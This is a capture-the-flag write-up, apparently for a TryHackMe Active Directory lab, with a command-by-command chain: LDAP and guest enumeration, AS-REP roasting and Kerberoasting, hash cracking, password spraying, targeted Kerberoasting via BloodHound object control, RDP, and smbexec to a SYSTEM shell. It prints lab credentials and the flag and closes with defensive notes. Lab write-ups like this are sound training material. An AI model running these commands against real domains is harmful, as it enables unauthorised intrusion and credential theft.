# Operation End-Game

## Overview

Windows Active Directory box for `thm.local`. The path was anonymous/guest LDAP enumeration, Kerberoasting, password reuse discovery, targeted Kerberoasting through BloodHound object control, RDP as a higher-value user, then admin shell access with discovered credentials.

## Command-By-Command Walkthrough

### 1. Full TCP Scan

```bash
nmap -sV -sC -vv -T4 -p- 10.64.181.217
```

Why it was run:

- Find every open TCP port, not just the default top ports.
- Run default NSE scripts with `-sC`.
- Identify service versions with `-sV`.
- Use higher timing with `-T4` because this is a lab target.

What it showed:

- The machine was a Windows Active Directory domain controller.
- AD services were exposed: DNS `53`, Kerberos `88`, LDAP `389`, SMB `445`, Global Catalog `3268/3269`, RDP `3389`.
- Domain info leaked through LDAP and RDP: `thm.local`, host `ad.thm.local`.
- SMB signing was enabled and required.

Why it mattered:

- This told you the box was an AD attack path, so the right next moves were LDAP, SMB, Kerberos, and BloodHound enumeration.

### 2. Enumerate Domain Users Through LDAP

```bash
ldapsearch -x -H ldap://10.67.128.6 -b "DC=thm,DC=local" -s sub "(objectClass=user)" sAMAccountName | grep sAMAccountName
```

Why it was run:

- Check whether LDAP allowed anonymous/simple queries.
- Pull usernames from the domain using the `sAMAccountName` attribute.
- Build a user list for later Kerberos checks, password spraying, and general AD mapping.

What it showed:

- LDAP returned many domain users.
- This confirmed LDAP enumeration was possible without a strong credential.

Why it mattered:

- Usernames are fuel for AD attacks. They let you test AS-REP roasting, Kerberoasting, password reuse, and BloodHound collection once credentials are found.

### 3. Search For Service-Account-Looking Users

```bash
ldapsearch -x -H ldap://10.67.128.6 -b "DC=thm,DC=local" -s sub "(&(objectClass=user)(sAMAccountName=*SA))" description sAMAccountName
```

Why it was run:

- Narrow the huge user list to accounts ending in `SA`.
- `SA` often hints at service accounts, staging accounts, or privileged support accounts.
- Pull `description` fields, because AD descriptions sometimes leak roles or passwords.

What it showed:

- Multiple `*SA` accounts existed.
- Some had descriptions like `Tier 1 User`.
- Some were placed in interesting OUs such as `Tier 0`, `Tier 1`, `Admin`, `ServiceAccounts`, and `Stage`.

Why it mattered:

- It gave you a better mental map of the domain structure and possible high-value account naming patterns.

### 4. AS-REP Roasting Check

```bash
/home/yoinkas/HACKER/TOOLS/impacket/examples/GetNPUsers.py thm.local/ -dc-ip 10.67.128.6 -request
```

Why it was run:

- Find accounts with Kerberos pre-authentication disabled.
- Request AS-REP hashes that can be cracked offline.

What it showed:

- AS-REP roastable users existed:
  `SHELLEY_BEARD`, `ISIAH_WALKER`, `QUEEN_GARNER`, `PHYLLIS_MCCOY`, `MAXINE_FREEMAN`.
- Hashes were returned.

Why it mattered:

- This was a valid possible foothold path. Even though your successful path used Kerberoasting, checking AS-REP roasting was the right AD move after getting user enumeration.

### 5. Test Guest SMB Access

```bash
nxc smb 10.67.128.6 -u guest -p ''
```

Why it was run:

- Check if the Guest account was enabled with a blank password.
- Confirm SMB authentication behavior.

What it showed:

- `thm.local\guest` authenticated successfully.
- The host was `AD`, domain `thm.local`, SMB signing was enabled, and SMBv1 was not available.

Why it mattered:

- A working guest credential can often read LDAP, enumerate shares, or request Kerberos tickets depending on domain configuration.

### 6. Test Guest LDAP Access

```bash
nxc ldap 10.67.128.6 -u 'guest' -p ''
```

Why it was run:

- Check whether the same Guest account could bind to LDAP.
- Confirm whether LDAP enumeration could continue with authenticated guest access.

What it showed:

- Guest LDAP authentication worked.

Why it mattered:

- Authenticated LDAP access is enough for several AD enumeration and Kerberos attack techniques.

### 7. Kerberoast As Guest

```bash
nxc ldap 10.67.128.6 -u 'guest' -p '' --kerberoasting kerberoastables.txt
```

Why it was run:

- Search LDAP for users with Service Principal Names.
- Request TGS tickets for those SPN accounts.
- Save crackable Kerberos hashes to `kerberoastables.txt`.

What it showed:

- One Kerberoastable account was returned.

Why it mattered:

- Kerberoasting gives an offline password-cracking opportunity without needing interactive access.

### 8. Inspect The Kerberoast Hash File

```bash
cat kerberoastables.txt
```

Why it was run:

- Verify that `nxc` actually wrote the Kerberos TGS hash.
- Identify which account the hash belonged to.

What it showed:

- The hash belonged to `CODY_ROY`.

Why it mattered:

- `CODY_ROY` became the next target for offline cracking.

### 9. Re-run Kerberoasting With More Visible Output

```bash
nxc ldap 10.67.128.6 -u 'guest' -p '' --kerberoasting kerberoastables.txt
```

Why it was run:

- Reconfirm the roastable account and get clearer metadata.

What it showed:

- `CODY_ROY` was a member of `Remote Desktop Users`.
- `CODY_ROY` had an SPN and returned a TGS hash.

Why it mattered:

- Membership in `Remote Desktop Users` hinted that cracking this account could provide RDP access or at least a stronger foothold.

### 10. Crack Cody's TGS Hash With John

```bash
john kerberoastables.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Why it was run:

- Crack the Kerberoast hash offline using `rockyou.txt`.

What it showed:

```text
CODY_ROY : MKO)mko0
```

Why it mattered:

- This was the first real domain credential in the chain.

### 11. Collect BloodHound Data As Cody

```bash
bloodhound-ce-python -u 'cody_roy@thm.local' -p 'MKO)mko0' --zip -dc ad.thm.local -c All -d thm.local -ns 10.67.128.6 --dns-timeout 10 --dns-tcp
```

Why it was run:

- Use valid domain credentials to collect AD relationships.
- Gather users, groups, computers, OUs, GPOs, ACLs, and sessions where possible.
- Package the output for BloodHound CE.

What it showed:

- BloodHound collection succeeded.
- It found `490` users, `53` groups, `4` GPOs, `216` OUs, `19` containers, and `1` computer.

Why it mattered:

- BloodHound turned the domain from a big list of objects into an attack graph. That is how the Zachary-to-Jerri object-control path was found.

### 12. Kerberoast Again As Cody With Impacket

```bash
python /home/yoinkas/HACKER/TOOLS/impacket/examples/GetUserSPNs.py -request -dc-ip ad.thm.local thm.local/cody_roy:'MKO)mko0'
```

Why it was run:

- Use Cody's real domain credentials to request SPN-backed service tickets.
- Compare results with the guest-based Kerberoast.
- Look for additional service accounts that guest may not have revealed.

What it showed:

- SPNs were found for:
  `CHRISTIAN_SANFORD` with `HTTP/server.thm.local` and `HTTP/server.example.com`.
  `CODY_ROY` with `HTTP/server.secure.com`.
- Both were in `Remote Desktop Users`.
- TGS hashes were printed for offline cracking.

Why it mattered:

- It confirmed more SPN/service-account attack surface and reinforced that `Remote Desktop Users` was important in this box.

### 13. Enumerate Domain Users With Cody

```bash
nxc ldap ad.thm.local -u 'cody_roy' -p 'MKO)mko0' --users
```

Why it was run:

- Enumerate users using a real domain account instead of guest.
- Pull a fuller, cleaner user list for spraying or later analysis.

What it showed:

- `489` domain users were enumerated.
- User output included names, last password set times, bad password counts, and descriptions.

Why it mattered:

- This gave you a reliable account list for checking password reuse.

### 14. Create A Username File

```bash
nxc ldap ad.thm.local -u 'cody_roy' -p 'MKO)mko0' --users | awk '{print $5}' | grep -v "Username" > names.txt
```

Why it was run:

- Extract the username column from the `nxc --users` output.
- Remove the table header.
- Save the result to `names.txt`.

What it showed:

- No direct output because the command redirected results into a file.

Why it mattered:

- `names.txt` became the input list for password reuse testing.

### 15. Spray Cody's Password Against The User List

```bash
nxc smb ad.thm.local -u names.txt -p 'MKO)mko0' --continue-on-success
```

Why it was run:

- Test whether any other users reused Cody's password.
- `--continue-on-success` keeps testing after the first valid hit.

What it showed:

```text
CODY_ROY : MKO)mko0
ZACHARY_HUNT : MKO)mko0
```

Why it mattered:

- Password reuse gave you `ZACHARY_HUNT`, which was the account needed for the BloodHound object-control path.

### 16. Targeted Kerberoast Jerri As Zachary

```bash
python3 targetedKerberoast.py -v -d 'thm.local' -u 'ZACHARY_HUNT' -p 'MKO)mko0' --dc-ip 10.65.153.33 --request-user JERRI_LANCASTER
```

Why it was run:

- BloodHound showed Zachary had object control over Jerri.
- The tool abuses that control by temporarily adding an SPN to Jerri, requesting a TGS hash, then removing the SPN.

What it showed:

- SPN added successfully for `JERRI_LANCASTER`.
- A Kerberos TGS hash was printed.
- SPN removed successfully afterward.

Why it mattered:

- This converted object-control rights into a crackable hash for a user who had RDP access.

### 17. Crack Jerri's Targeted Kerberoast Hash

```bash
hashcat -m 13100 -a 0 jerri-lancaster /usr/share/wordlists/rockyou.txt
```

Why it was run:

- Crack the Kerberos 5 TGS hash using Hashcat mode `13100`.
- Use straight dictionary mode `-a 0`.

What it showed:

```text
JERRI_LANCASTER : lovinlife!
```

Why it mattered:

- Jerri was in `Remote Desktop Users`, so cracking this password unlocked interactive Windows access.

### 18. RDP As Jerri

```bash
xfreerdp /v:ad.thm.local /u:'jerri_lancaster' /p:'lovinlife!' /dynamic-resolution /clipboard /cert:ignore
```

Why it was run:

- Log in interactively over RDP using Jerri's recovered password.
- Use dynamic resolution and clipboard support for easier enumeration.
- Ignore certificate warnings because this is a lab host with a self-signed/internal certificate.

What it showed:

- RDP login succeeded.

Why it mattered:

- This moved you from remote enumeration to interactive access on the Windows machine.

### 19. Change Directory In Windows Shell

```cmd
cd C:/
```

Why it was run:

- Move from the temporary/default shell location to the root of the `C:` drive.

What it showed:

- The shell prompt changed to `C:\>`.

Why it mattered:

- It made it easier to inspect common directories like `Users`, `Scripts`, and `Windows`.

### 20. Mistaken Linux Command In Windows

```cmd
ls
```

Why it was run:

- Habit from Linux enumeration.

What it showed:

```text
'ls' is not recognized as an internal or external command
```

Why it mattered:

- Reminder that this shell was standard Windows `cmd.exe`; use `dir`, `type`, `whoami`, etc.

### 21. List The C Drive

```cmd
dir
```

Why it was run:

- Enumerate root-level directories.

What it showed:

- Interesting directories included `Scripts`, `Users`, and `Windows`.

Why it mattered:

- `C:\Scripts` stood out as a likely custom/admin script location.

### 22. List The Scripts Directory

```cmd
dir C:\Scripts
```

Why it was run:

- Inspect the custom scripts folder discovered at the drive root.

What it showed:

```text
syncer.ps1
```

Why it mattered:

- PowerShell scripts often contain automation credentials, service credentials, or paths to scheduled/admin tasks.

### 23. Read The Sync Script

```cmd
type C:\Scripts\syncer.ps1
```

Why it was run:

- Read the PowerShell script without opening an editor.

What it showed:

- The script imported the Active Directory module.
- It defined credentials for `SANFORD_DAUGHERTY`.
- It used `ConvertTo-SecureString ... -AsPlainText -Force`.
- It built a `PSCredential`.
- It ran `Sync-ADObject` from `ad.thm.local` to `ad2.thm.local`.

Why it mattered:

- The script exposed the credential that led to the final SYSTEM shell:

```text
SANFORD_DAUGHERTY : RESET_ASAP123
```

### 24. Use SMBExec With The Script Credential

```bash
smbexec.py 'THM.LOCAL/SANFORD_DAUGHERTY:RESET_ASAP123@ad.thm.local@ad.thm.local'
```

Why it was run:

- Use the recovered `SANFORD_DAUGHERTY` credential to execute commands over SMB.
- Test whether that account had administrative rights on the target.

What it showed:

- `smbexec.py` launched a semi-interactive shell.

Why it mattered:

- This was the final privilege jump from RDP/user-level access to administrative command execution.

### 25. Confirm Final Privilege

```cmd
whoami
```

Why it was run:

- Confirm the security context of the shell.

What it showed:

```text
nt authority\system
```

Why it mattered:

- `NT AUTHORITY\SYSTEM` is the highest local Windows privilege level.

### 26. Read The Final Flag

```cmd
type C:\Users\Administrator\Desktop\flag.txt.txt
```

Why it was run:

- Read the administrator flag file from the desktop.

What it showed:

```text
THM{INFILTRATION_COMPLETE_OUR_COMMAND_OVER_NETWORK_ASSERTS}
```

Why it mattered:

- This completed the box.

## Screenshot Analysis

### `image.png`

This is the room/export cover image showing a server-style icon. It does not contain technical evidence, credentials, or a command result. I would keep it only as a visual header if these notes are for personal organization.

### `image 1.png`

This is a BloodHound screenshot focused on `ZACHARY_HUNT@THM.LOCAL`.

What it shows:

- Zachary has `First Degree Object Control: 1`.
- Zachary has `Transitive Object Control: 6`.
- A highlighted edge points from `ZACHARY_HUNT` toward `JERRI_LANCASTER`.

Why it mattered:

- This justified using `ZACHARY_HUNT` for targeted Kerberoasting against `JERRI_LANCASTER`.
- Without this relationship, the targeted Kerberoast command would not have made sense.

### `Screenshot_2026-09-16_094151.png`

This is another BloodHound view focused on `JERRI_LANCASTER@THM.LOCAL`.

What it shows:

- Jerri is connected to `DOMAIN USERS@THM.LOCAL`.
- Jerri is connected to `REMOTE DESKTOP USERS@THM.LOCAL`.

Why it mattered:

- This explains why cracking Jerri's password was valuable.
- Membership in `Remote Desktop Users` meant Jerri could log in interactively with RDP.

### `Screenshot_2026-09-16_094757.png`

This is the Windows `cmd.exe` session after RDP access.

What it shows:

- You were inside a Windows shell.
- You moved to `C:\`.
- `ls` failed because it was `cmd.exe`, not a Linux shell.
- `dir` revealed root directories, including `Scripts`.

Why it mattered:

- It documents the beginning of local post-exploitation enumeration.
- The key discovery path was noticing `C:\Scripts`.

### `image 2.png`

This is the most important RDP/local enumeration screenshot.

What it shows:

- RDP session to `ad.thm.local`.
- `dir C:\Scripts` revealed `syncer.ps1`.
- `type C:\Scripts\syncer.ps1` displayed a PowerShell script.
- The script contained:
  - `Import-Module ActiveDirectory`
  - username `SANFORD_DAUGHERTY`
  - a plaintext password passed into `ConvertTo-SecureString`
  - `Sync-ADObject` syncing from `ad.thm.local` to `ad2.thm.local`

Why it mattered:

- This screenshot explains where the final credential came from.
- The script was likely intended for AD synchronization automation, but it stored a reusable privileged credential in plaintext.
- That credential enabled `smbexec.py` to get `NT AUTHORITY\SYSTEM`.

## Target

- IPs observed: `10.64.181.217`, later `10.67.128.6`, later `10.66.143.249`
- Hostname: `ad.thm.local`
- Domain: `thm.local`
- NetBIOS/domain name: `THM`
- OS: Windows Server 2019 / Windows 10 build `17763`
- Web server: Microsoft IIS 10.0

## Enumeration

Full port scan:

```bash
nmap -sV -sC -vv -T4 -p- 10.64.181.217
```

Important ports:

```text
53/tcp    DNS
80/tcp    Microsoft IIS 10.0
88/tcp    Kerberos
135/tcp   MSRPC
139/tcp   NetBIOS
389/tcp   LDAP
443/tcp   HTTPS
445/tcp   SMB
464/tcp   kpasswd
593/tcp   RPC over HTTP
636/tcp   LDAPS
3268/tcp  Global Catalog LDAP
3269/tcp  Global Catalog LDAPS
3389/tcp  RDP
9389/tcp  AD Web Services / .NET Message Framing
47001/tcp Microsoft HTTPAPI
```

Key findings:

- LDAP revealed the domain as `thm.local`.
- RDP certificate exposed `ad.thm.local`.
- SMB signing was enabled and required.
- Guest/null-style auth worked against SMB and LDAP.

## LDAP User Enumeration

Command used:

```bash
ldapsearch -x -H ldap://10.67.128.6 -b "DC=thm,DC=local" -s sub "(objectClass=user)" sAMAccountName | grep sAMAccountName
```

This produced a large list of users. Service-account-looking names ended in `SA`, so a more targeted LDAP query was useful:

```bash
ldapsearch -x -H ldap://10.67.128.6 -b "DC=thm,DC=local" -s sub "(&(objectClass=user)(sAMAccountName=*SA))" description sAMAccountName
```

Notable accounts:

```text
74820323SA
569434710SA
6643765058SA
8429491684SA
7063939681SA
3513161954SA
5103729844SA
9885253046SA
2974122699SA
6523676673SA
2302150644SA
575134123SA
101551296SA
5998682031SA
```

## AS-REP Roast Check

Command:

```bash
GetNPUsers.py thm.local/ -dc-ip 10.67.128.6 -request
```

AS-REP roastable users found:

```text
SHELLEY_BEARD
ISIAH_WALKER
QUEEN_GARNER
PHYLLIS_MCCOY
MAXINE_FREEMAN
```

This produced AS-REP hashes, but the successful path in the notes moved through Kerberoasting instead.

## Guest Access

Guest worked over SMB:

```bash
nxc smb 10.67.128.6 -u guest -p ''
```

Guest also worked over LDAP:

```bash
nxc ldap 10.67.128.6 -u guest -p ''
```

## Kerberoasting With Guest

Command:

```bash
nxc ldap 10.67.128.6 -u 'guest' -p '' --kerberoasting kerberoastables.txt
```

Result:

```text
sAMAccountName: CODY_ROY
memberOf: Remote Desktop Users
```

Crack with John:

```bash
john kerberoastables.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Recovered credential:

```text
CODY_ROY : MKO)mko0
```

## BloodHound Collection

Command:

```bash
bloodhound-ce-python -u 'cody_roy@thm.local' -p 'MKO)mko0' --zip -dc ad.thm.local -c All -d thm.local -ns 10.67.128.6 --dns-timeout 10 --dns-tcp
```

Collection results:

```text
490 users
53 groups
4 GPOs
216 OUs
19 containers
0 trusts
```

BloodHound showed:

- `ZACHARY_HUNT@THM.LOCAL` had outbound object control.
- `ZACHARY_HUNT` had a control path to `JERRI_LANCASTER`.
- `JERRI_LANCASTER` was a member of `REMOTE DESKTOP USERS@THM.LOCAL`.

## Password Reuse Discovery

Create a user list:

```bash
nxc ldap ad.thm.local -u 'cody_roy' -p 'MKO)mko0' --users | awk '{print $5}' | grep -v "Username" > names.txt
```

Spray Cody's password carefully:

```bash
nxc smb ad.thm.local -u names.txt -p 'MKO)mko0' --continue-on-success
```

Successful accounts:

```text
CODY_ROY : MKO)mko0
ZACHARY_HUNT : MKO)mko0
```

## Targeted Kerberoast

Because `ZACHARY_HUNT` had object control over `JERRI_LANCASTER`, use targeted Kerberoasting to temporarily add an SPN, request the TGS, and remove the SPN.

Command:

```bash
python3 targetedKerberoast.py -v -d 'thm.local' -u 'ZACHARY_HUNT' -p 'MKO)mko0' --dc-ip 10.65.153.33 --request-user JERRI_LANCASTER
```

Result:

```text
SPN added successfully for JERRI_LANCASTER
Kerberos TGS hash printed
SPN removed successfully for JERRI_LANCASTER
```

Crack the TGS:

```bash
hashcat -m 13100 -a 0 jerri-lancaster /usr/share/wordlists/rockyou.txt
```

Recovered credential:

```text
JERRI_LANCASTER : lovinlife!
```

## RDP Access

Since `JERRI_LANCASTER` was in Remote Desktop Users:

```bash
xfreerdp /v:ad.thm.local /u:'jerri_lancaster' /p:'lovinlife!' /dynamic-resolution /clipboard /cert:ignore
```

This provided interactive access to the Windows host.

## Final Access

The final admin credential used in the raw notes:

```text
SANFORD_DAUGHERTY : RESET_ASAP123
```

Shell command:

```bash
smbexec.py 'THM.LOCAL/SANFORD_DAUGHERTY:RESET_ASAP123@ad.thm.local@ad.thm.local'
```

Validation:

```cmd
whoami
```

Result:

```text
nt authority\system
```

Flag command:

```cmd
type C:\Users\Administrator\Desktop\flag.txt.txt
```

Flag:

```text
THM{INFILTRATION_COMPLETE_OUR_COMMAND_OVER_NETWORK_ASSERTS}
```

## Attack Chain

```text
Port scan
-> Identify AD services and thm.local
-> Enumerate LDAP users anonymously/with guest
-> Confirm guest SMB and LDAP access
-> Kerberoast as guest
-> Crack CODY_ROY
-> Collect BloodHound data as CODY_ROY
-> Spray reused password
-> Find ZACHARY_HUNT also uses MKO)mko0
-> Use Zachary object control to targeted-Kerberoast JERRI_LANCASTER
-> Crack JERRI_LANCASTER
-> RDP as JERRI_LANCASTER
-> Use recovered admin credential with smbexec
-> SYSTEM shell
-> Read flag
```

## Key Lessons

- LDAP can leak a full user list when anonymous or guest binds are allowed.
- Guest LDAP access can be enough to request Kerberoastable service tickets.
- Password reuse makes one cracked credential much more valuable.
- BloodHound is excellent for turning raw AD data into an actionable privilege path.
- Object-control rights can often be abused with targeted Kerberoasting.
- RDP group membership is a practical access path even when the account is not an admin.

## Defensive Notes

- Disable guest/null authentication where possible.
- Restrict LDAP anonymous/guest enumeration.
- Enforce strong, unique passwords and monitor for password spraying.
- Remove unnecessary SPNs and monitor SPN changes.
- Review BloodHound-style object-control paths, especially outbound control from normal users.
- Limit Remote Desktop Users membership.
- Rotate exposed or reused credentials.
